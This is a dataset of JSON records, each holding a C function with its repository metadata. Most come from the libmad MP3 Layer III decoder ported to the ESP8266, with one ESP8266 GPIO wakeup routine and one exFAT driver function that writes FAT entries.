{"docstring": "/*\n * NAME:\tIII_freqinver()\n * DESCRIPTION:\tperform subband frequency inversion for odd sample lines\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_freqinver(mad_fixed_t sample[18][32], unsigned int sb)", "code": "{\n  unsigned int i;\n\n# if 1 || defined(ASO_INTERLEAVE1) || defined(ASO_INTERLEAVE2)\n  {\n    register mad_fixed_t tmp1, tmp2;\n\n    tmp1 = sample[1][sb];\n    tmp2 = sample[3][sb];\n\n    for (i = 1; i < 13; i += 4) {\n      sample[i + 0][sb] = -tmp1;\n      tmp1 = sample[i + 4][sb];\n      sample[i + 2][sb] = -tmp2;\n      tmp2 = sample[i + 6][sb];\n    }\n\n    sample[13][sb] = -tmp1;\n    tmp1 = sample[17][sb];\n    sample[15][sb] = -tmp2;\n    sample[17][sb] = -tmp1;\n  }\n# else\n  for (i = 1; i < 18; i += 2)\n    sample[i][sb] = -sample[i][sb];\n# endif\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_imdct_l()\n * DESCRIPTION:\tperform IMDCT and windowing for long blocks\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_imdct_l(mad_fixed_t const X[18], mad_fixed_t z[36],\n\t\t unsigned int block_type)", "code": "{\n  unsigned int i;\n\n  /* IMDCT */\n\n  imdct36(X, z);\n\n  /* windowing */\n\n  switch (block_type) {\n  case 0:  /* normal window */\n# if defined(ASO_INTERLEAVE1)\n    {\n      register mad_fixed_t tmp1, tmp2;\n\n      tmp1 = window_l[0];\n      tmp2 = window_l[1];\n\n      for (i = 0; i < 34; i += 2) {\n\tz[i + 0] = mad_f_mul(z[i + 0], tmp1);\n\ttmp1 = window_l[i + 2];\n\tz[i + 1] = mad_f_mul(z[i + 1], tmp2);\n\ttmp2 = window_l[i + 3];\n      }\n\n      z[34] = mad_f_mul(z[34], tmp1);\n      z[35] = mad_f_mul(z[35], tmp2);\n    }\n# elif defined(ASO_INTERLEAVE2)\n    {\n      register mad_fixed_t tmp1, tmp2;\n\n      tmp1 = z[0];\n      tmp2 = window_l[0];\n\n      for (i = 0; i < 35; ++i) {\n\tz[i] = mad_f_mul(tmp1, tmp2);\n\ttmp1 = z[i + 1];\n\ttmp2 = window_l[i + 1];\n      }\n\n      z[35] = mad_f_mul(tmp1, tmp2);\n    }\n# elif 1\n    for (i = 0; i < 36; i += 4) {\n      z[i + 0] = mad_f_mul(z[i + 0], window_l[i + 0]);\n      z[i + 1] = mad_f_mul(z[i + 1], window_l[i + 1]);\n      z[i + 2] = mad_f_mul(z[i + 2], window_l[i + 2]);\n      z[i + 3] = mad_f_mul(z[i + 3], window_l[i + 3]);\n    }\n# else\n    for (i =  0; i < 36; ++i) z[i] = mad_f_mul(z[i], window_l[i]);\n# endif\n    break;\n\n  case 1:  /* start block */\n    for (i =  0; i < 18; i += 3) {\n      z[i + 0] = mad_f_mul(z[i + 0], window_l[i + 0]);\n      z[i + 1] = mad_f_mul(z[i + 1], window_l[i + 1]);\n      z[i + 2] = mad_f_mul(z[i + 2], window_l[i + 2]);\n    }\n    /*  (i = 18; i < 24; ++i) z[i] unchanged */\n    for (i = 24; i < 30; ++i) z[i] = mad_f_mul(z[i], window_s[i - 18]);\n    for (i = 30; i < 36; ++i) z[i] = 0;\n    break;\n\n  case 3:  /* stop block */\n    for (i =  0; i <  6; ++i) z[i] = 0;\n    for (i =  6; i < 12; ++i) z[i] = mad_f_mul(z[i], window_s[i - 6]);\n    /*  (i = 12; i < 18; ++i) z[i] unchanged */\n    for (i = 18; i < 36; i += 3) {\n      z[i + 0] = mad_f_mul(z[i + 0], window_l[i + 0]);\n      z[i + 1] = mad_f_mul(z[i + 1], window_l[i + 1]);\n      z[i + 2] = mad_f_mul(z[i + 2], window_l[i + 2]);\n    }\n    break;\n  }\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tlayer->III()\n * DESCRIPTION:\tdecode a single Layer III frame\n */\n", "func_signal": "int ICACHE_FLASH_ATTR mad_layer_III(struct mad_stream *stream, struct mad_frame *frame)", "code": "{\n  struct mad_header *header = &frame->header;\n  unsigned int nch, priv_bitlen, next_md_begin = 0;\n  unsigned int si_len, data_bitlen, md_len;\n  unsigned int frame_space, frame_used, frame_free;\n  struct mad_bitptr ptr;\n  struct sideinfo si;\n  enum mad_error error;\n  int result = 0, i;\n  static mad_fixed_t ovlbuf[2 * 32 * 18];\n\n  /* allocate Layer III dynamic structures */\n    frame->overlap=(void*)ovlbuf;\n\tstream->main_data=&MainData;\n/*\n  if (stream->main_data == 0) {\n    stream->main_data = malloc(MAD_BUFFER_MDLEN);\n    if (stream->main_data == 0) {\n      stream->error = MAD_ERROR_NOMEM;\n      return -1;\n    }\n  }\n\n  if (frame->overlap == 0) {\n    frame->overlap = calloc(2 * 32 * 18, sizeof(mad_fixed_t));\n    if (frame->overlap == 0) {\n      stream->error = MAD_ERROR_NOMEM;\n      return -1;\n    }\n  }\n*/\n\n  nch = MAD_NCHANNELS(header);\n  si_len = (header->flags & MAD_FLAG_LSF_EXT) ?\n    (nch == 1 ? 9 : 17) : (nch == 1 ? 17 : 32);\n\n  /* check frame sanity */\n\n  if (stream->next_frame - mad_bit_nextbyte(&stream->ptr) <\n      (signed int) si_len) {\n    stream->error = MAD_ERROR_BADFRAMELEN;\n    stream->md_len = 0;\n    return -1;\n  }\n\n  /* check CRC word */\n\n  if (header->flags & MAD_FLAG_PROTECTION) {\n    header->crc_check =\n      mad_bit_crc(stream->ptr, si_len * CHAR_BIT, header->crc_check);\n\n    if (header->crc_check != header->crc_target &&\n\t!(frame->options & MAD_OPTION_IGNORECRC)) {\n      stream->error = MAD_ERROR_BADCRC;\n      result = -1;\n    }\n  }\n  /* decode frame side information */\n\n  error = III_sideinfo(&stream->ptr, nch, header->flags & MAD_FLAG_LSF_EXT,\n\t\t       &si, &data_bitlen, &priv_bitlen);\n  if (error && result == 0) {\n    stream->error = error;\n    result = -1;\n  }\n\n  header->flags        |= priv_bitlen;\n  header->private_bits |= si.private_bits;\n\n\n  /* find main_data of next frame */\n\n  {\n    struct mad_bitptr peek;\n    unsigned long header;\n\n    mad_bit_init(&peek, stream->next_frame);\n\n    header = mad_bit_read(&peek, 32);\n    if ((header & 0xffe60000L) /* syncword | layer */ == 0xffe20000L) {\n      if (!(header & 0x00010000L))  /* protection_bit */\n\tmad_bit_skip(&peek, 16);  /* crc_check */\n\n      next_md_begin =\n\tmad_bit_read(&peek, (header & 0x00080000L) /* ID */ ? 9 : 8);\n    }\n\n    mad_bit_finish(&peek);\n  }\n\n  /* find main_data of this frame */\n\n  frame_space = stream->next_frame - mad_bit_nextbyte(&stream->ptr);\n\n  if (next_md_begin > si.main_data_begin + frame_space)\n    next_md_begin = 0;\n\n  md_len = si.main_data_begin + frame_space - next_md_begin;\n\n  frame_used = 0;\n\n  if (si.main_data_begin == 0) {\n    ptr = stream->ptr;\n    stream->md_len = 0;\n\n    frame_used = md_len;\n  }\n  else {\n    if (si.main_data_begin > stream->md_len) {\n      if (result == 0) {\n\tstream->error = MAD_ERROR_BADDATAPTR;\n\tresult = -1;\n      }\n    }\n    else {\n      mad_bit_init(&ptr,\n\t\t   *stream->main_data + stream->md_len - si.main_data_begin);\n\n      if (md_len > si.main_data_begin) {\n\tassert(stream->md_len + md_len -\n\t       si.main_data_begin <= MAD_BUFFER_MDLEN);\n\n\tmemcpy(*stream->main_data + stream->md_len,\n\t       mad_bit_nextbyte(&stream->ptr),\n\t       frame_used = md_len - si.main_data_begin);\n\tstream->md_len += frame_used;\n      }\n    }\n  }\n\n  frame_free = frame_space - frame_used;\n\n  /* decode main_data */\n\n  if (result == 0) {\n    error = III_decode(&ptr, frame, &si, nch);\n    if (error) {\n      stream->error = error;\n      result = -1;\n    }\n\n    /* designate ancillary bits */\n\n    stream->anc_ptr    = ptr;\n    stream->anc_bitlen = md_len * CHAR_BIT - data_bitlen;\n  }\n\n# if 0 && defined(DEBUG)\n  fprintf(stderr,\n\t  \"main_data_begin:%u, md_len:%u, frame_free:%u, \"\n\t  \"data_bitlen:%u, anc_bitlen: %u\\n\",\n\t  si.main_data_begin, md_len, frame_free,\n\t  data_bitlen, stream->anc_bitlen);\n# endif\n\n  /* preload main_data buffer with up to 511 bytes for next frame(s) */\n\n  if (frame_free >= next_md_begin) {\n    memcpy(*stream->main_data,\n\t   stream->next_frame - next_md_begin, next_md_begin);\n    stream->md_len = next_md_begin;\n  }\n  else {\n    if (md_len < si.main_data_begin) {\n      unsigned int extra;\n\n      extra = si.main_data_begin - md_len;\n      if (extra + frame_free > next_md_begin)\n\textra = next_md_begin - frame_free;\n\n      if (extra < stream->md_len) {\n\tmemmove(*stream->main_data,\n\t\t*stream->main_data + stream->md_len - extra, extra);\n\tstream->md_len = extra;\n      }\n    }\n    else\n      stream->md_len = 0;\n\n    memcpy(*stream->main_data + stream->md_len,\n\t   stream->next_frame - frame_free, frame_free);\n    stream->md_len += frame_free;\n  }\n\n  return result;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_scalefactors()\n * DESCRIPTION:\tdecode channel scalefactors of one granule from a bitstream\n */\n", "func_signal": "static\nunsigned int ICACHE_FLASH_ATTR III_scalefactors(struct mad_bitptr *ptr, struct channel *channel,\n\t\t\t      struct channel const *gr0ch, unsigned int scfsi)", "code": "{\n  struct mad_bitptr start;\n  unsigned int slen1, slen2, sfbi;\n\n  start = *ptr;\n\n  slen1 = unalChar(&sflen_table[channel->scalefac_compress].slen1);\n  slen2 = unalChar(&sflen_table[channel->scalefac_compress].slen2);\n\n  if (channel->block_type == 2) {\n    unsigned int nsfb;\n\n    sfbi = 0;\n\n    nsfb = (channel->flags & mixed_block_flag) ? 8 + 3 * 3 : 6 * 3;\n    while (nsfb--)\n      channel->scalefac[sfbi++] = mad_bit_read(ptr, slen1);\n\n    nsfb = 6 * 3;\n    while (nsfb--)\n      channel->scalefac[sfbi++] = mad_bit_read(ptr, slen2);\n\n    nsfb = 1 * 3;\n    while (nsfb--)\n      channel->scalefac[sfbi++] = 0;\n  }\n  else {  /* channel->block_type != 2 */\n    if (scfsi & 0x8) {\n      for (sfbi = 0; sfbi < 6; ++sfbi)\n\tchannel->scalefac[sfbi] = gr0ch->scalefac[sfbi];\n    }\n    else {\n      for (sfbi = 0; sfbi < 6; ++sfbi)\n\tchannel->scalefac[sfbi] = mad_bit_read(ptr, slen1);\n    }\n\n    if (scfsi & 0x4) {\n      for (sfbi = 6; sfbi < 11; ++sfbi)\n\tchannel->scalefac[sfbi] = gr0ch->scalefac[sfbi];\n    }\n    else {\n      for (sfbi = 6; sfbi < 11; ++sfbi)\n\tchannel->scalefac[sfbi] = mad_bit_read(ptr, slen1);\n    }\n\n    if (scfsi & 0x2) {\n      for (sfbi = 11; sfbi < 16; ++sfbi)\n\tchannel->scalefac[sfbi] = gr0ch->scalefac[sfbi];\n    }\n    else {\n      for (sfbi = 11; sfbi < 16; ++sfbi)\n\tchannel->scalefac[sfbi] = mad_bit_read(ptr, slen2);\n    }\n\n    if (scfsi & 0x1) {\n      for (sfbi = 16; sfbi < 21; ++sfbi)\n\tchannel->scalefac[sfbi] = gr0ch->scalefac[sfbi];\n    }\n    else {\n      for (sfbi = 16; sfbi < 21; ++sfbi)\n\tchannel->scalefac[sfbi] = mad_bit_read(ptr, slen2);\n    }\n\n    channel->scalefac[21] = 0;\n  }\n\n  return mad_bit_length(&start, ptr);\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_scalefactors_lsf()\n * DESCRIPTION:\tdecode channel scalefactors for LSF from a bitstream\n */\n", "func_signal": "static\nunsigned int ICACHE_FLASH_ATTR III_scalefactors_lsf(struct mad_bitptr *ptr,\n\t\t\t\t  struct channel *channel,\n\t\t\t\t  struct channel *gr1ch, int mode_extension)", "code": "{\n  struct mad_bitptr start;\n  unsigned int scalefac_compress, index, slen[4], part, n, i;\n  unsigned char const *nsfb;\n\n  start = *ptr;\n\n  scalefac_compress = channel->scalefac_compress;\n  index = (channel->block_type == 2) ?\n    ((channel->flags & mixed_block_flag) ? 2 : 1) : 0;\n\n  if (!((mode_extension & I_STEREO) && gr1ch)) {\n    if (scalefac_compress < 400) {\n      slen[0] = (scalefac_compress >> 4) / 5;\n      slen[1] = (scalefac_compress >> 4) % 5;\n      slen[2] = (scalefac_compress % 16) >> 2;\n      slen[3] =  scalefac_compress %  4;\n\n      nsfb = nsfb_table[0][index];\n    }\n    else if (scalefac_compress < 500) {\n      scalefac_compress -= 400;\n\n      slen[0] = (scalefac_compress >> 2) / 5;\n      slen[1] = (scalefac_compress >> 2) % 5;\n      slen[2] =  scalefac_compress %  4;\n      slen[3] = 0;\n\n      nsfb = nsfb_table[1][index];\n    }\n    else {\n      scalefac_compress -= 500;\n\n      slen[0] = scalefac_compress / 3;\n      slen[1] = scalefac_compress % 3;\n      slen[2] = 0;\n      slen[3] = 0;\n\n      channel->flags |= preflag;\n\n      nsfb = nsfb_table[2][index];\n    }\n\n    n = 0;\n    for (part = 0; part < 4; ++part) {\n      for (i = 0; i < nsfb[part]; ++i)\n\tchannel->scalefac[n++] = mad_bit_read(ptr, slen[part]);\n    }\n\n    while (n < 39)\n      channel->scalefac[n++] = 0;\n  }\n  else {  /* (mode_extension & I_STEREO) && gr1ch (i.e. ch == 1) */\n    scalefac_compress >>= 1;\n\n    if (scalefac_compress < 180) {\n      slen[0] =  scalefac_compress / 36;\n      slen[1] = (scalefac_compress % 36) / 6;\n      slen[2] = (scalefac_compress % 36) % 6;\n      slen[3] = 0;\n\n      nsfb = nsfb_table[3][index];\n    }\n    else if (scalefac_compress < 244) {\n      scalefac_compress -= 180;\n\n      slen[0] = (scalefac_compress % 64) >> 4;\n      slen[1] = (scalefac_compress % 16) >> 2;\n      slen[2] =  scalefac_compress %  4;\n      slen[3] = 0;\n\n      nsfb = nsfb_table[4][index];\n    }\n    else {\n      scalefac_compress -= 244;\n\n      slen[0] = scalefac_compress / 3;\n      slen[1] = scalefac_compress % 3;\n      slen[2] = 0;\n      slen[3] = 0;\n\n      nsfb = nsfb_table[5][index];\n    }\n\n    n = 0;\n    for (part = 0; part < 4; ++part) {\n      unsigned int max, is_pos;\n\n      max = (1 << slen[part]) - 1;\n\n      for (i = 0; i < nsfb[part]; ++i) {\n\tis_pos = mad_bit_read(ptr, slen[part]);\n\n\tchannel->scalefac[n] = is_pos;\n\tgr1ch->scalefac[n++] = (is_pos == max);\n      }\n    }\n\n    while (n < 39) {\n      channel->scalefac[n] = 0;\n      gr1ch->scalefac[n++] = 0;  /* apparently not illegal */\n    }\n  }\n\n  return mad_bit_length(&start, ptr);\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_overlap_z()\n * DESCRIPTION:\tperform \"overlap-add\" of zero IMDCT outputs\n */\n", "func_signal": "static inline\nvoid ICACHE_FLASH_ATTR III_overlap_z(mad_fixed_t overlap[18],\n\t\t   mad_fixed_t sample[18][32], unsigned int sb)", "code": "{\n  unsigned int i;\n\n# if defined(ASO_INTERLEAVE2)\n  {\n    register mad_fixed_t tmp1, tmp2;\n\n    tmp1 = overlap[0];\n    tmp2 = overlap[1];\n\n    for (i = 0; i < 16; i += 2) {\n      sample[i + 0][sb] = tmp1;\n      overlap[i + 0]    = 0;\n      tmp1 = overlap[i + 2];\n\n      sample[i + 1][sb] = tmp2;\n      overlap[i + 1]    = 0;\n      tmp2 = overlap[i + 3];\n    }\n\n    sample[16][sb] = tmp1;\n    overlap[16]    = 0;\n    sample[17][sb] = tmp2;\n    overlap[17]    = 0;\n  }\n# else\n  for (i = 0; i < 18; ++i) {\n    sample[i][sb] = overlap[i];\n    overlap[i]    = 0;\n  }\n# endif\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_stereo()\n * DESCRIPTION:\tperform joint stereo processing on a granule\n */\n", "func_signal": "static\nenum mad_error ICACHE_FLASH_ATTR III_stereo(mad_fixed_t xr[2][576],\n\t\t\t  struct granule const *granule,\n\t\t\t  struct mad_header *header,\n\t\t\t  unsigned char const *sfbwidth)", "code": "{\n  short modes[39];\n  unsigned int sfbi, l, n, i;\n\n  if (granule->ch[0].block_type !=\n      granule->ch[1].block_type ||\n      (granule->ch[0].flags & mixed_block_flag) !=\n      (granule->ch[1].flags & mixed_block_flag))\n    return MAD_ERROR_BADSTEREO;\n\n  for (i = 0; i < 39; ++i)\n    modes[i] = header->mode_extension;\n\n  /* intensity stereo */\n\n  if (header->mode_extension & I_STEREO) {\n    struct channel const *right_ch = &granule->ch[1];\n    mad_fixed_t const *right_xr = xr[1];\n    unsigned int is_pos;\n\n    header->flags |= MAD_FLAG_I_STEREO;\n\n    /* first determine which scalefactor bands are to be processed */\n\n    if (right_ch->block_type == 2) {\n      unsigned int lower, start, max, bound[3], w;\n\n      lower = start = max = bound[0] = bound[1] = bound[2] = 0;\n\n      sfbi = l = 0;\n\n      if (right_ch->flags & mixed_block_flag) {\n\twhile (l < 36) {\n\t  n = unalChar(&sfbwidth[sfbi++]);\n\n\t  for (i = 0; i < n; ++i) {\n\t    if (right_xr[i]) {\n\t      lower = sfbi;\n\t      break;\n\t    }\n\t  }\n\n\t  right_xr += n;\n\t  l += n;\n\t}\n\n\tstart = sfbi;\n      }\n\n      w = 0;\n      while (l < 576) {\n\tn = unalChar(&sfbwidth[sfbi++]);\n\n\tfor (i = 0; i < n; ++i) {\n\t  if (right_xr[i]) {\n\t    max = bound[w] = sfbi;\n\t    break;\n\t  }\n\t}\n\n\tright_xr += n;\n\tl += n;\n\tw = (w + 1) % 3;\n      }\n\n      if (max)\n\tlower = start;\n\n      /* long blocks */\n\n      for (i = 0; i < lower; ++i)\n\tmodes[i] = header->mode_extension & ~I_STEREO;\n\n      /* short blocks */\n\n      w = 0;\n      for (i = start; i < max; ++i) {\n\tif (i < bound[w])\n\t  modes[i] = header->mode_extension & ~I_STEREO;\n\n\tw = (w + 1) % 3;\n      }\n    }\n    else {  /* right_ch->block_type != 2 */\n      unsigned int bound;\n\n      bound = 0;\n      for (sfbi = l = 0; l < 576; l += n) {\n\tn = unalChar(&sfbwidth[sfbi++]);\n\n\tfor (i = 0; i < n; ++i) {\n\t  if (right_xr[i]) {\n\t    bound = sfbi;\n\t    break;\n\t  }\n\t}\n\n\tright_xr += n;\n      }\n\n      for (i = 0; i < bound; ++i)\n\tmodes[i] = header->mode_extension & ~I_STEREO;\n    }\n\n    /* now do the actual processing */\n\n    if (header->flags & MAD_FLAG_LSF_EXT) {\n      unsigned char const *illegal_pos = granule[1].ch[1].scalefac;\n      mad_fixed_t const *lsf_scale;\n\n      /* intensity_scale */\n      lsf_scale = is_lsf_table[right_ch->scalefac_compress & 0x1];\n\n      for (sfbi = l = 0; l < 576; ++sfbi, l += n) {\n\tn = unalChar(&sfbwidth[sfbi]);\n\n\tif (!(modes[sfbi] & I_STEREO))\n\t  continue;\n\n\tif (illegal_pos[sfbi]) {\n\t  modes[sfbi] &= ~I_STEREO;\n\t  continue;\n\t}\n\n\tis_pos = right_ch->scalefac[sfbi];\n\n\tfor (i = 0; i < n; ++i) {\n\t  register mad_fixed_t left;\n\n\t  left = xr[0][l + i];\n\n\t  if (is_pos == 0)\n\t    xr[1][l + i] = left;\n\t  else {\n\t    register mad_fixed_t opposite;\n\n\t    opposite = mad_f_mul(left, lsf_scale[(is_pos - 1) / 2]);\n\n\t    if (is_pos & 1) {\n\t      xr[0][l + i] = opposite;\n\t      xr[1][l + i] = left;\n\t    }\n\t    else\n\t      xr[1][l + i] = opposite;\n\t  }\n\t}\n      }\n    }\n    else {  /* !(header->flags & MAD_FLAG_LSF_EXT) */\n      for (sfbi = l = 0; l < 576; ++sfbi, l += n) {\n\tn = unalChar(&sfbwidth[sfbi]);\n\n\tif (!(modes[sfbi] & I_STEREO))\n\t  continue;\n\n\tis_pos = right_ch->scalefac[sfbi];\n\n\tif (is_pos >= 7) {  /* illegal intensity position */\n\t  modes[sfbi] &= ~I_STEREO;\n\t  continue;\n\t}\n\n\tfor (i = 0; i < n; ++i) {\n\t  register mad_fixed_t left;\n\n\t  left = xr[0][l + i];\n\n\t  xr[0][l + i] = mad_f_mul(left, is_table[    is_pos]);\n\t  xr[1][l + i] = mad_f_mul(left, is_table[6 - is_pos]);\n\t}\n      }\n    }\n  }\n\n  /* middle/side stereo */\n\n  if (header->mode_extension & MS_STEREO) {\n    register mad_fixed_t invsqrt2;\n\n    header->flags |= MAD_FLAG_MS_STEREO;\n\n    invsqrt2 = root_table[3 + -2];\n\n    for (sfbi = l = 0; l < 576; ++sfbi, l += n) {\n      n = unalChar(&sfbwidth[sfbi]);\n\n      if (modes[sfbi] != MS_STEREO)\n\tcontinue;\n\n      for (i = 0; i < n; ++i) {\n\tregister mad_fixed_t m, s;\n\n\tm = xr[0][l + i];\n\ts = xr[1][l + i];\n\n\txr[0][l + i] = mad_f_mul(m + s, invsqrt2);  /* l = (m + s) / sqrt(2) */\n\txr[1][l + i] = mad_f_mul(m - s, invsqrt2);  /* r = (m - s) / sqrt(2) */\n      }\n    }\n  }\n\n  return MAD_ERROR_NONE;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n  only highlevel and lowlevel intr can use for wakeup\n*/\n", "func_signal": "void ICACHE_FLASH_ATTR\ngpio_pin_wakeup_enable(uint32 i, GPIO_INT_TYPE intr_state)", "code": "{\n    uint32 pin_reg;\n\n    if ((intr_state == GPIO_PIN_INTR_LOLEVEL) || (intr_state == GPIO_PIN_INTR_HILEVEL)) {\n        portENTER_CRITICAL();\n\n        pin_reg = GPIO_REG_READ(GPIO_PIN_ADDR(i));\n        pin_reg &= (~GPIO_PIN_INT_TYPE_MASK);\n        pin_reg |= (intr_state << GPIO_PIN_INT_TYPE_LSB);\n        pin_reg |= GPIO_PIN_WAKEUP_ENABLE_SET(GPIO_WAKEUP_ENABLE);\n        GPIO_REG_WRITE(GPIO_PIN_ADDR(i), pin_reg);\n\n        portEXIT_CRITICAL();\n    }\n}", "path": "ESP8266_MP3_DECODER/examples/driver_lib/driver/gpio.c", "commit_date": "2014-12-26 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_exponents()\n * DESCRIPTION:\tcalculate scalefactor exponents\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_exponents(struct channel const *channel,\n\t\t   unsigned char const *sfbwidth, signed int exponents[39])", "code": "{\n  signed int gain;\n  unsigned int scalefac_multiplier, sfbi;\n\n  gain = (signed int) channel->global_gain - 210;\n  scalefac_multiplier = (channel->flags & scalefac_scale) ? 2 : 1;\n\n  if (channel->block_type == 2) {\n    unsigned int l;\n    signed int gain0, gain1, gain2;\n\n    sfbi = l = 0;\n\n    if (channel->flags & mixed_block_flag) {\n      unsigned int premask;\n\n      premask = (channel->flags & preflag) ? ~0 : 0;\n\n      /* long block subbands 0-1 */\n\n      while (l < 36) {\n\texponents[sfbi] = gain -\n\t  (signed int) ((channel->scalefac[sfbi] + (pretab[sfbi] & premask)) <<\n\t\t\tscalefac_multiplier);\n\n\tl += unalChar(&sfbwidth[sfbi++]);\n      }\n    }\n\n    /* this is probably wrong for 8000 Hz short/mixed blocks */\n\n    gain0 = gain - 8 * (signed int) channel->subblock_gain[0];\n    gain1 = gain - 8 * (signed int) channel->subblock_gain[1];\n    gain2 = gain - 8 * (signed int) channel->subblock_gain[2];\n\n    while (l < 576) {\n      exponents[sfbi + 0] = gain0 -\n\t(signed int) (channel->scalefac[sfbi + 0] << scalefac_multiplier);\n      exponents[sfbi + 1] = gain1 -\n\t(signed int) (channel->scalefac[sfbi + 1] << scalefac_multiplier);\n      exponents[sfbi + 2] = gain2 -\n\t(signed int) (channel->scalefac[sfbi + 2] << scalefac_multiplier);\n\n      l    += 3 * unalChar(&sfbwidth[sfbi]);\n      sfbi += 3;\n    }\n  }\n  else {  /* channel->block_type != 2 */\n    if (channel->flags & preflag) {\n      for (sfbi = 0; sfbi < 22; ++sfbi) {\n\texponents[sfbi] = gain -\n\t  (signed int) ((channel->scalefac[sfbi] + pretab[sfbi]) <<\n\t\t\tscalefac_multiplier);\n      }\n    }\n    else {\n      for (sfbi = 0; sfbi < 22; ++sfbi) {\n\texponents[sfbi] = gain -\n\t  (signed int) (channel->scalefac[sfbi] << scalefac_multiplier);\n      }\n    }\n  }\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/* end of __FAT_read */\n", "func_signal": "static s32 __FAT_write(struct super_block *sb, u32 loc, u32 content)", "code": "{\n\ts32 off;\n\tsector_t sec;\n\tu8 *fat_sector, *fat_entry;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\tBD_INFO_T *p_bd = &(EXFAT_SB(sb)->bd_info);\n\n\tif (p_fs->vol_type == FAT12) {\n\n\t\tcontent &= 0x00000FFF;\n\n\t\tsec = p_fs->FAT1_start_sector + ((loc + (loc >> 1)) >> p_bd->sector_size_bits);\n\t\toff = (loc + (loc >> 1)) & p_bd->sector_size_mask;\n\n\t\tfat_sector = FAT_getblk(sb, sec);\n\t\tif (!fat_sector)\n\t\t\treturn -1;\n\n\t\tif (loc & 1) { /* odd */\n\n\t\t\tcontent <<= 4;\n\n\t\t\tif (off == (p_bd->sector_size-1)) {\n\t\t\t\tfat_sector[off] = (u8)(content | (fat_sector[off] & 0x0F));\n\t\t\t\tFAT_modify(sb, sec);\n\n\t\t\t\tfat_sector = FAT_getblk(sb, ++sec);\n\t\t\t\tif (!fat_sector)\n\t\t\t\t\treturn -1;\n\n\t\t\t\tfat_sector[0] = (u8)(content >> 8);\n\t\t\t} else {\n\t\t\t\tfat_entry = &(fat_sector[off]);\n\t\t\t\tcontent |= GET16(fat_entry) & 0x000F;\n\n\t\t\t\tSET16(fat_entry, content);\n\t\t\t}\n\t\t} else { /* even */\n\t\t\tfat_sector[off] = (u8)(content);\n\n\t\t\tif (off == (p_bd->sector_size-1)) {\n\t\t\t\tfat_sector[off] = (u8)(content);\n\t\t\t\tFAT_modify(sb, sec);\n\n\t\t\t\tfat_sector = FAT_getblk(sb, ++sec);\n\t\t\t\tfat_sector[0] = (u8)((fat_sector[0] & 0xF0) | (content >> 8));\n\t\t\t} else {\n\t\t\t\tfat_entry = &(fat_sector[off]);\n\t\t\t\tcontent |= GET16(fat_entry) & 0xF000;\n\n\t\t\t\tSET16(fat_entry, content);\n\t\t\t}\n\t\t}\n\t}\n\n\telse if (p_fs->vol_type == FAT16) {\n\n\t\tcontent &= 0x0000FFFF;\n\n\t\tsec = p_fs->FAT1_start_sector + (loc >> (p_bd->sector_size_bits-1));\n\t\toff = (loc << 1) & p_bd->sector_size_mask;\n\n\t\tfat_sector = FAT_getblk(sb, sec);\n\t\tif (!fat_sector)\n\t\t\treturn -1;\n\n\t\tfat_entry = &(fat_sector[off]);\n\n\t\tSET16_A(fat_entry, content);\n\t}\n\n\telse if (p_fs->vol_type == FAT32) {\n\n\t\tcontent &= 0x0FFFFFFF;\n\n\t\tsec = p_fs->FAT1_start_sector + (loc >> (p_bd->sector_size_bits-2));\n\t\toff = (loc << 2) & p_bd->sector_size_mask;\n\n\t\tfat_sector = FAT_getblk(sb, sec);\n\t\tif (!fat_sector)\n\t\t\treturn -1;\n\n\t\tfat_entry = &(fat_sector[off]);\n\n\t\tcontent |= GET32_A(fat_entry) & 0xF0000000;\n\n\t\tSET32_A(fat_entry, content);\n\t}\n\n\telse { /* p_fs->vol_type == EXFAT */\n\n\t\tsec = p_fs->FAT1_start_sector + (loc >> (p_bd->sector_size_bits-2));\n\t\toff = (loc << 2) & p_bd->sector_size_mask;\n\n\t\tfat_sector = FAT_getblk(sb, sec);\n\t\tif (!fat_sector)\n\t\t\treturn -1;\n\n\t\tfat_entry = &(fat_sector[off]);\n\n\t\tSET32_A(fat_entry, content);\n\t}\n\n\tFAT_modify(sb, sec);\n\treturn 0;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
